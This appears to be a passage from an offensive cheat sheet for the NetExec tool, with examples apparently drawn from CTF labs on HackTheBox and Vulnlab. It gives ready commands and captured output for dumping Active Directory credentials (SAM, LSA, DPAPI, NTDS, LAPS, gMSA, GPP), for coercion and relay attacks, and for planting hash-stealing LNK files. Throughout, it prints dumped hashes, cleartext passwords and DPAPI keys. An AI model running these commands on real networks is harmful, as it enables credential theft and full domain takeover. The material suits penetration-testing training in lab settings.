SMB         10.10.140.38    445    BERSRV200        [*] Windows Server 2022 Build 20348 x64 (name:BERSRV200) (domain:BERSRV200) (signing:False) (SMBv1:False)
SMB         10.10.140.38    445    BERSRV200        [+] BERSRV200\administrator:NakedMelonMan25 (Pwn3d!)
SMB         10.10.140.38    445    BERSRV200        [+] Dumping LSA secrets
SMB         10.10.140.38    445    BERSRV200        KAIJU.VL/sasrv200:$DCC2$10240#sasrv200#44a1583ed4678aa2fba0bd7d13eea30f: (2024-01-30 20:13:30)
SMB         10.10.140.38    445    BERSRV200        KAIJU.VL/Clare.Frost:$DCC2$10240#Clare.Frost#180216e4d0aa40dbf4767dd7ba50f187: (2024-01-21 15:01:24)
SMB         10.10.140.38    445    BERSRV200        KAIJU.VL/Administrator:$DCC2$10240#Administrator#873c4a9511ccfd89537a22fc1cc3ff35: (2024-01-21 15:17:37)
SMB         10.10.140.38    445    BERSRV200        KAIJU\BERSRV200$:aes256-cts-hmac-sha1-96:2bc6bcf3d19902bf1bb63950d8616e718062e2a993970c58621855f9a05053a6
SMB         10.10.140.38    445    BERSRV200        KAIJU\BERSRV200$:aes128-cts-hmac-sha1-96:4ad19e245ca12d8ba71c06fb35505a83
SMB         10.10.140.38    445    BERSRV200        KAIJU\BERSRV200$:des-cbc-md5:f7e0d6bccd8fe307
SMB         10.10.140.38    445    BERSRV200        KAIJU\BERSRV200$:plain_password_hex:093beb160682f0b8de04c65f94e42e2098e54ffdc83b716d5f734f63b01d69149e8afb51ba603a86a8dd4978eca49ae71fd9b6054d101da6da55e2e64ebe950ac04c28222438bae36ab4db6143e60434d0b24ac8fc77d2872ab9026838affde25ef3ae06f7be4eebf7ad715659bebdefd4f1f0b22566a054fca1bf58bf4db8a79d78a3ef683ad780b1643f1e23c2a8776e58221f0f57ac42d17bcb4287be6345cfec3e6b00f7a661593fc4ff0722071cf795d62ffd3648df6dd69fb8d42250f09ff972544c6ca1abd86e853f5fcb076cfdb3dde5e50f5ed26013f3b448bde82dc3d83eab5bfcb49677cfac8dec89c047
SMB         10.10.140.38    445    BERSRV200        KAIJU\BERSRV200$:aad3b435b51404eeaad3b435b51404ee:3e342bd3befe6574952c99b26e422155:::
SMB         10.10.140.38    445    BERSRV200        kaiju.vl\clare.frost:atnTYzyew3Ok+d
SMB         10.10.140.38    445    BERSRV200        dpapi_machinekey:0x2aa75aaaf206bfaee9c962443bdf9c2b6f3dca59
dpapi_userkey:0x43b9ced8e9f1fe8ccad60dbdff5563d9ce01503b
SMB         10.10.140.38    445    BERSRV200        NL$KM:f0007655dcd94e9ac9d96297420e6e476d04125482e1344ad539e305a5da4d89ef554f90517ae4351b799056da2d74551a1429a0abd9124de1a7e928314ced3e
SMB         10.10.140.38    445    BERSRV200        kaiju.vl\sasrv200:7rq7uf26brZgcSSX
SMB         10.10.140.38    445    BERSRV200        [+] Dumped 12 LSA secrets to /home/serioton/.nxc/logs/BERSRV200_10.10.140.38_2024-04-23_165541.secrets and /home/serioton/.nxc/logs/BERSRV200_10.10.140.38_2024-04-23_165541.cached
```

### DPAPI

Decrypts saved credentials, scheduled task credentials and browser passwords.

```
netexec smb $target -u $username -p $password --dpapi
```

```
$ netexec smb ms01 -u administrator -p 'H447.++h6g5}xi' --local-auth --dpapi
SMB         10.10.162.38    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.10.162.38    445    MS01             [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)
SMB         10.10.162.38    445    MS01             [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
SMB         10.10.162.38    445    MS01             [+] Got 7 decrypted masterkeys. Looting secrets...
SMB         10.10.162.38    445    MS01             [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} - REFLECTION\Georgia.Price:DBl+5MPkpJg5id
```

Writeup: [Reflection](https://seriotonctf.github.io/Reflection-Vulnlab/#Credential-Dumps)

### Chaining Arguments

Dumps everything in one run.

```
netexec smb $target -u $username -p $password --sam --lsa --dpapi
```

```
$ netexec smb 172.16.20.2 -u administrator -H 88d84ec08dad123eb04a060a74053f21 --local-auth --sam --lsa --dpapi
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:WEB-01) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] WEB-01\administrator:88d84ec08dad123eb04a060a74053f21 (Pwn3d!)
SMB         172.16.20.2     445    WEB-01           [*] Dumping SAM hashes
SMB         172.16.20.2     445    WEB-01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
SMB         172.16.20.2     445    WEB-01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.2     445    WEB-01           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.2     445    WEB-01           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.2     445    WEB-01           [+] Added 4 SAM hashes to the database
SMB         172.16.20.2     445    WEB-01           [+] Dumping LSA secrets
SMB         172.16.20.2     445    WEB-01           DARKCORP.HTB/svc_acc:$DCC2$10240#svc_acc#3a5485946a63220d3c4b118b36361dbb: (2025-02-09 16:48:52+00:00)
SMB         172.16.20.2     445    WEB-01           darkcorp\WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
SMB         172.16.20.2     445    WEB-01           darkcorp\WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
SMB         172.16.20.2     445    WEB-01           darkcorp\WEB-01$:des-cbc-md5:38e00bb3d901eaef
SMB         172.16.20.2     445    WEB-01           darkcorp\WEB-01$:plain_password_hex:4100520044006c002600710072005a00640022007400230061003d004f00520063005e006b006e004f005d00270034004b0041003a003900390074006200320031006a0040005a004f004f005c004b003b00760075006600210063004f0075002f003c0072005d0043004c004a005800250075006c002d00440064005f006b00380038002c00270049002c0046004000680027003b004500200021003b0042004d005f0064003b0066002300700068005500440069002f0054002300320022005f004c0056004c003c0049006f002600480076002c005d00610034005500470077004a0076005f003400740054004800
SMB         172.16.20.2     445    WEB-01           darkcorp\WEB-01$:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
SMB         172.16.20.2     445    WEB-01           dpapi_machinekey:0x1004cecdc9b33080d25a4a29126d4590eb555c5f
dpapi_userkey:0x7f3f9f871ea1dafaea01ae4ccf6e3f7ee535e472
SMB         172.16.20.2     445    WEB-01           NL$KM:ddc92114b923691bd8befd576b3c3ee19d3d3f7482af7533fd74616eb72455af6f61a0bc2b2a86cf6eece0d33798fee514547da9a6451937f120244b18431972
SMB         172.16.20.2     445    WEB-01           [+] Dumped 8 LSA secrets to /home/serioton/.nxc/logs/WEB-01_172.16.20.2_2025-02-09_180729.secrets and /home/serioton/.nxc/logs/WEB-01_172.16.20.2_2025-02-09_180729.cached
SMB         172.16.20.2     445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.20.2     445    WEB-01           [+] Got 4 decrypted masterkeys. Looting secrets...
SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

### NTDS

Requires Domain Admin or DCSync rights. Dumping the whole NTDS can crash a Server 2019 DC, `--user` dumps one account and `-M ntdsutil` is the safer way to take everything.

```
netexec smb $target -u $username -p $password --ntds
netexec smb $target -u $username -p $password --ntds --user Administrator
netexec smb $target -u $username -p $password -M ntdsutil
```

```
$ netexec smb puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         10.129.180.151  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.180.151  445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
SMB         10.129.180.151  445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.180.151  445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
SMB         10.129.180.151  445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.180.151  445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
SMB         10.129.180.151  445    DC               PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
SMB         10.129.180.151  445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
```

### LSASS

Dumps the credentials of logged on users from memory. Expect AV to catch it.

```
netexec smb $target -u $username -p $password -M lsassy
```

### LAPS

If your user can read the LAPS password, NetExec reads it and logs in as the local administrator with it.

```
netexec smb $target -u $username -p $password --laps
```

```
$ netexec smb ms01 -u abbie.smith -p 'CMe1x+nlRaaWEw' --laps
SMB         10.10.162.38    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.162.38    445    MS01             [+] MS01\administrator:H447.++h6g5}xi (Pwn3d!)
```

Writeup: [Reflection](https://seriotonctf.github.io/Reflection-Vulnlab/#Credential-Dumps)

### gMSA

The gMSA password can be read by the principals in `PrincipalsAllowedToReadPassword`.

```
netexec ldap $target -u $username -p $password --gmsa
netexec ldap $target -u $username -p $password --gmsa-convert-id $id
netexec ldap $domain -u $username -p $password --gmsa-decrypt-lsa $gmsa_account
```

```
$ netexec ldap haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
LDAP        10.129.98.51    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
LDAPS       10.129.98.51    636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       10.129.98.51    636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.98.51    636    DC01             Account: Haze-IT-Backup$      NTLM: 735c02c6b2dc54c3c8c6891f55279ebc
```

### Group Policy Preferences

Old Group Policy Preferences stored passwords in SYSVOL, encrypted with a key Microsoft published. Any domain user can read and decrypt them.

```
netexec smb $target -u $username -p $password -M gpp_password
```

```
$ proxychains4 -q netexec smb 10.10.140.5 -u samuel.davies -p l6fkiy9oN -M gpp_password
SMB         10.10.140.5    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
SMB         10.10.140.5    445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN
SMB         10.10.140.5    445    MUCDC            [*] Enumerated shares
SMB         10.10.140.5    445    MUCDC            Share           Permissions     Remark
SMB         10.10.140.5    445    MUCDC            -----           -----------     ------
SMB         10.10.140.5    445    MUCDC            accounting$
SMB         10.10.140.5    445    MUCDC            ADMIN$                          Remote Admin
SMB         10.10.140.5    445    MUCDC            C$                              Default share
SMB         10.10.140.5    445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.140.5    445    MUCDC            home$           READ
SMB         10.10.140.5    445    MUCDC            IPC$                            Remote IPC
SMB         10.10.140.5    445    MUCDC            it$
SMB         10.10.140.5    445    MUCDC            NETLOGON        READ            Logon server share
SMB         10.10.140.5    445    MUCDC            SYSVOL          READ            Logon server share
SMB         10.10.140.5    445    MUCDC            transfer$       READ,WRITE
GPP_PASS... 10.10.140.5    445    MUCDC            [+] Found SYSVOL share
GPP_PASS... 10.10.140.5    445    MUCDC            [*] Searching for potential XML files containing passwords
SMB         10.10.140.5    445    MUCDC            [*] Started spidering
SMB         10.10.140.5    445    MUCDC            [*] Spidering .
SMB         10.10.140.5    445    MUCDC            //10.10.140.5/SYSVOL/heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml [lastm:'2024-06-04 12:01' size:1135]
SMB         10.10.140.5    445    MUCDC            [*] Done spidering (Completed in 9.205448389053345)
GPP_PASS... 10.10.140.5    445    MUCDC            [*] Found heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.10.140.5    445    MUCDC            [+] Found credentials in heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.10.140.5    445    MUCDC            Password: H3r0n2024#!
GPP_PASS... 10.10.140.5    445    MUCDC            action: U
GPP_PASS... 10.10.140.5    445    MUCDC            newName: _local
GPP_PASS... 10.10.140.5    445    MUCDC            fullName:
GPP_PASS... 10.10.140.5    445    MUCDC            description: local administrator
GPP_PASS... 10.10.140.5    445    MUCDC            changeLogon: 0
GPP_PASS... 10.10.140.5    445    MUCDC            noChange: 0
GPP_PASS... 10.10.140.5    445    MUCDC            neverExpires: 1
GPP_PASS... 10.10.140.5    445    MUCDC            acctDisabled: 0
GPP_PASS... 10.10.140.5    445    MUCDC            subAuthority: RID_ADMIN
GPP_PASS... 10.10.140.5    445    MUCDC            userName: Administrator (built-in)
```

### Backup Operators

Abuse a member of Backup Operators to save the SAM, SYSTEM and SECURITY hives and dump the DC

```
netexec smb $target -u $username -p $password -M backup_operator
```

```
$ netexec smb lusdc -u tony.ward -p U_cPVQqEI50i1X -M backup_operator
SMB         10.10.152.69    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)
SMB         10.10.152.69    445    LUSDC            [+] lustrous.vl\tony.ward:U_cPVQqEI50i1X
BACKUP_O... 10.10.152.69    445    LUSDC            [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 10.10.152.69    445    LUSDC            Saved HKLM\SAM to \\10.10.152.69\SYSVOL\SAM
BACKUP_O... 10.10.152.69    445    LUSDC            Saved HKLM\SYSTEM to \\10.10.152.69\SYSVOL\SYSTEM
BACKUP_O... 10.10.152.69    445    LUSDC            Saved HKLM\SECURITY to \\10.10.152.69\SYSVOL\SECURITY
SMB         10.10.152.69    445    LUSDC            [*] Copying "SAM" to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SAM"
SMB         10.10.152.69    445    LUSDC            [+] File "SAM" was downloaded to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SAM"
SMB         10.10.152.69    445    LUSDC            [*] Copying "SECURITY" to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SECURITY"
SMB         10.10.152.69    445    LUSDC            [+] File "SECURITY" was downloaded to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SECURITY"
SMB         10.10.152.69    445    LUSDC            [*] Copying "SYSTEM" to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SYSTEM"
SMB         10.10.152.69    445    LUSDC            [+] File "SYSTEM" was downloaded to "/home/serio/.nxc/logs/LUSDC_10.10.152.69_2025-05-22_001520.SYSTEM"
BACKUP_O... 10.10.152.69    445    LUSDC            Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e10fc3898a203cbc159f559d8183297:::
BACKUP_O... 10.10.152.69    445    LUSDC            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 10.10.152.69    445    LUSDC            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 10.10.152.69    445    LUSDC            $MACHINE.ACC:plain_password_hex:37790ad294f9da5c124d58be007c7206a744acfecf13988592fc9353bacf064fedb267ab8436c617f3aca446fbd1e8b67de3620e7480036355b146e82a05d216e9fd11953a5def7213e8bfbf643f0908dab480a0cd2d79c933e1a41586e2c7df2226230065055f007ffab3a35cf17908b67c069b1ff55bd1b182977be8f76e9138774febe2d8e96ff2d4a2504747ad03256184ecc3e6abf20a8bf0255cd2152461d42c53a6982cdc58e283a06107e346aba5cabe85eb2f925e5dba65a6c050d2ff17ff099dab1e928858d815636bd3042e25c9ff931601c6f64336648d2f7d9f63e6a01f1cc056d2a988cdd7f5a4ba73
BACKUP_O... 10.10.152.69    445    LUSDC            $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:5e6ad7904122844db9a3ff3bad64e6e9
BACKUP_O... 10.10.152.69    445    LUSDC            dpapi_machinekey:0x908c1b9d1eba6062f66247d016952eab010c4f62
dpapi_userkey:0xe7d85d4c5db116a07bd02c655623691eae32c387
BACKUP_O... 10.10.152.69    445    LUSDC            NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
SMB         10.10.152.69    445    LUSDC            [-] lustrous.vl\Administrator:1e10fc3898a203cbc159f559d8183297 STATUS_LOGON_FAILURE
BACKUP_O... 10.10.152.69    445    LUSDC            [*] Use the domain admin account to clean the file on the remote host
```

### Dump Through S4U Delegation

Impersonate a user through constrained delegation and dump in one step

```
netexec smb $target -u $username -p $password --delegate Administrator --sam --lsa
```

```
$ netexec smb 10.10.11.5 -u meow$ -p 'Summer2024!' --delegate Administrator --lsa --sam
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\Administrator through S4U with meow$ (Pwn3d!)
SMB         10.10.11.5      445    DC               [*] Dumping SAM hashes
SMB         10.10.11.5      445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:680c12d4ef693a3ae0fcd442c3b5874a:::
SMB         10.10.11.5      445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.5      445    DC               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.5      445    DC               [+] Added 3 SAM hashes to the database
SMB         10.10.11.5      445    DC               [+] Dumping LSA secrets
SMB         10.10.11.5      445    DC               FREELANCER\DC$:plain_password_hex:1f36a3b5a23441f6054f56f97d29c3312ca75d6d7450912ea81648778b5e540c6f38ab1335f9b27f4c69646359f12f2358d272bc0de36d5a9073b2358f68f1873425130a4b88bd750a55f018f1a83d1108691f4757b92f3f1242147e656fe2e1c38e312d5f26f6d9377cb01a53c38d689a48f4c1fcb5320d06fd6c3184810ba49ec8197a0b14f8e9a06f7a83e68437412e57cfa5bc2aa78a782412c509c139cf2cd85efea4b1ea5cafbb1146bc3eb5431eda9feae2854e25c4d1f357d6dc2844c2b7b86325bdca5985873644bd0b3de57996d8e442cd5996e2206072b8e7e90c621bd4f4f67f52be774a578c2d515d31
SMB         10.10.11.5      445    DC               FREELANCER\DC$:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
SMB         10.10.11.5      445    DC               dpapi_machinekey:0xe20295f92e7e0bff2615bed48f0a0be7067e28f2
dpapi_userkey:0xbc3e1b600d881e1867b0bdfe6ec833e9743c07d7
SMB         10.10.11.5      445    DC               NL$KM:d90b60a472c3b608e4f1ff5462916566deee1917583112cbdf2518d036b0c1f41b96c35f2273f0d6b9812f26ba696afd7fc70b8771bed5f58a74b43abdafdb71
SMB         10.10.11.5      445    DC               FREELANCER\sql_svc:v3ryS0l!dP@sswd#34
SMB         10.10.11.5      445    DC               [+] Dumped 5 LSA secrets to /home/serioton/.nxc/logs/DC_10.10.11.5_2025-02-14_000816.secrets and /home/serioton/.nxc/logs/DC_10.10.11.5_2025-02-14_000816.cached
```

### MSOL Account Password

Extracts the password of the MSOL account used by Azure AD Connect, which usually has DCSync rights.

```
netexec smb $target -u $username -p $password -M msol
```

## Coercion and Relay

### coerce_plus

Checks for PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug. Forces the target to authenticate to your listener, then relay it or capture it on a host with unconstrained delegation.

```
netexec smb $target -u $username -p $password -M coerce_plus
netexec smb $target -u $username -p $password -M coerce_plus -o LISTENER=$listener
netexec smb $target -u $username -p $password -M coerce_plus -o LISTENER=$listener METHOD=PetitPotam
```

```
$ netexec smb dc01.darkzero.htb -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=dc02.darkzero.ext
SMB         10.129.203.75   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domin:darkzero.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.203.75   445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
COERCE_PLUS 10.129.203.75   445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.203.75   445    DC01             Exploit Success, netdfs\NetrDfsAddStdRootForced
COERCE_PLUS 10.129.203.75   445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.129.203.75   445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
[07:23:51] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 -   coerce_plus.py:177
                    ept_s_not_registered
[07:23:52] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 -   coerce_plus.py:177
                    ept_s_not_registered
COERCE_PLUS 10.129.203.75   445    DC01             VULNERABLE, MSEven
```

### PetitPotam

Same as coerce_plus with `METHOD=PetitPotam`.

```
netexec smb $target -u $username -p $password -M petitpotam
```

```
$ proxychains4 -q netexec smb 192.168.100.101 -u Brandon.Keywarp -H db03d6a77a2205bc1d07082740626cc9 -M petitpotam
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [+] mist.htb\Brandon.Keywarp:db03d6a77a2205bc1d07082740626cc9
PETITPOTAM  192.168.100.101 445    MS01             VULNERABLE
PETITPOTAM  192.168.100.101 445    MS01             Next step: https://github.com/topotam/PetitPotam
```

### WebDAV

Checks whether the WebClient service is running on the target. With WebClient running, coercion goes over HTTP, and HTTP authentication can be relayed to LDAP.

```
netexec smb $target -u $username -p $password -M webdav
```

```
$ netexec smb WS01 -u 'Kathryn.Spencer' -p 'Chocolate1' -M webdav
SMB         10.10.155.38    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.10.155.38    445    WS01             [+] intercept.vl\Kathryn.Spencer:Chocolate1
WEBDAV      10.10.155.38    445    WS01             WebClient Service enabled on: 10.10.155.38
```

### slinky

Creates windows shortcuts with the icon attribute pointing to your SMB server in every writable share. Every user who opens the share sends a NetNTLMv2 hash to your Responder or relay.

```
netexec smb $target -u $username -p $password -M slinky -o SERVER=$listener NAME=important
```

```
$ netexec smb 10.10.10.5 -u john.doe -p 'P@ssw0rd' -M slinky -o SERVER=10.10.10.10 NAME=update
SMB         10.10.10.5      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:domain.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.5      445    DC01             [+] domain.local\john.doe:P@ssw0rd
SMB         10.10.10.5      445    DC01             [*] Enumerated shares
SMB         10.10.10.5      445    DC01             Share           Permissions     Remark
SMB         10.10.10.5      445    DC01             -----           -----------     ------
SMB         10.10.10.5      445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.5      445    DC01             C$                              Default share
SMB         10.10.10.5      445    DC01             Finance         READ            Finance team
SMB         10.10.10.5      445    DC01             HR              READ            HR files
SMB         10.10.10.5      445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.5      445    DC01             IT              READ            IT department
SMB         10.10.10.5      445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.5      445    DC01             Shared          READ,WRITE      Shared files
SMB         10.10.10.5      445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.10.5      445    DC01             Tools                           Software
SLINKY      10.10.10.5      445    DC01             [+] Found writable share: Shared
SLINKY      10.10.10.5      445    DC01             [+] Created LNK file on the Shared share
```

## Useful Modules

### change-password

Change your own expired password

```
netexec smb $target -u $username -p $password -M change-password -o NEWPASS=$new_password
```

```
$ netexec smb vigilant.vl -u Pamela.Clark -p Vigilant@Tech2024 -M change-password -o NEWPASS=P@ssw0rd
SMB         10.10.234.37    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:vigilant.vl) (signing:True) (SMBv1:False)
SMB         10.10.234.37    445    DC               [-] vigilant.vl\Pamela.Clark:Vigilant@Tech2024 STATUS_PASSWORD_EXPIRED
CHANGE-P... 10.10.234.37    445    DC               [+] Successfully changed password for Pamela.Clark
```

Reset the password of another user

```
netexec smb $target -u $username -p $password -M change-password -o USER='$target_user' NEWPASS='$new_password'
```

```
$ netexec smb dc.redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-password -o USER=helen.frost NEWPASS=Password123
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed password for helen.frost
```

Writeup: [Redelegate](https://seriotonctf.github.io/Redelegate-Vulnlab/#ForceChangePassword)

### timeroast

Requests NTP hashes for computer accounts, no credentials needed. Computer accounts with weak passwords, such as pre-created ones, crack with hashcat mode 31300.

```
netexec smb $target -M timeroast
```

```
$ netexec smb rustykey.htb -k -M timeroast
SMB         rustykey.htb    445    rustykey         [*]  x64 (name:rustykey) (domain:htb) (signing:True) (SMBv1:False)
TIMEROAST   rustykey.htb    445    rustykey         [*] Starting Timeroasting...
TIMEROAST   rustykey.htb    445    rustykey         1000:$sntp-ms$d4f2df34cdf27189b84123bd788f1852$1c0111e900000000000a00ad4c4f434ceb2068a77835539ee1b8428bffbfcd0aeb20698b941c4fc1eb20698b941cef24
TIMEROAST   rustykey.htb    445    rustykey         1103:$sntp-ms$8dc9aed1a4c34ccc28cfd6ee4bd39996$1c0111e900000000000a00ad4c4f434ceb2068a776701612e1b8428bffbfcd0aeb20698c566f99ebeb20698c56704bc2
TIMEROAST   rustykey.htb    445    rustykey         1104:$sntp-ms$f88479df22093966b53e9db79bdfad8b$1c0111e900000000000a00ad4c4f434ceb2068a7781e5e8fe1b8428bffbfcd0aeb20698c581df838eb20698c581e8d89
TIMEROAST   rustykey.htb    445    rustykey         1105:$sntp-ms$079cf9076c1df4aa3175feaf8747a1d2$1c0111e900000000000a00ad4c4f434ceb2068a77a2e04f6e1b8428bffbfcd0aeb20698c5a2d8dd7eb20698c5a2e415b
TIMEROAST   rustykey.htb    445    rustykey         1106:$sntp-ms$5587ef6754f3bbe68dc5031e22f8074e$1c0111e900000000000a00ad4c4f434ceb2068a777bce0c6e1b8428bffbfcd0aeb20698c5bd4ce23eb20698c5bd5b904
...[snip]...
```

### Vulnerability Checks

Old bugs, still seen in labs. Exploiting zerologon breaks the DC, only check it.

```
netexec smb $target -u $username -p $password -M zerologon
netexec smb $target -u $username -p $password -M nopac
netexec smb $target -u $username -p $password -M ms17-010
```

```
$ netexec smb 172.16.1.20 -M ms17-010
SMB         172.16.1.20     445    DC01             [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:DC01) (domain:domain.local) (signing:True) (SMBv1:True)
MS17-010                                            [+] 172.16.1.20 is likely VULNERABLE to MS17-010! (Windows Server 2012 R2 Standard 9600)
```

### enum_av

Lists the endpoint protection installed on the host

```
netexec smb $target -u $username -p $password -M enum_av
```

### Veeam

Extracts credentials from a local Veeam SQL database

```
netexec smb $target -u $username -p $password -M veeam
```

## Other Protocols

### MSSQL

`--local-auth` logs in with a SQL login instead of a Windows account. `-x` needs sysadmin or xp_cmdshell enabled.

```
netexec mssql $target -u $username -p $password
netexec mssql $target -u $username -p $password --local-auth
netexec mssql $target -u $username -p $password -x 'whoami'
netexec mssql $target -u $username -p $password -q 'SELECT name FROM master.dbo.sysdatabases'
netexec mssql $target -u $username -p $password --get-file $remote_file $local_file
```

```
$ netexec mssql dc01 -u web_prod -p Tribesman201 --local-auth
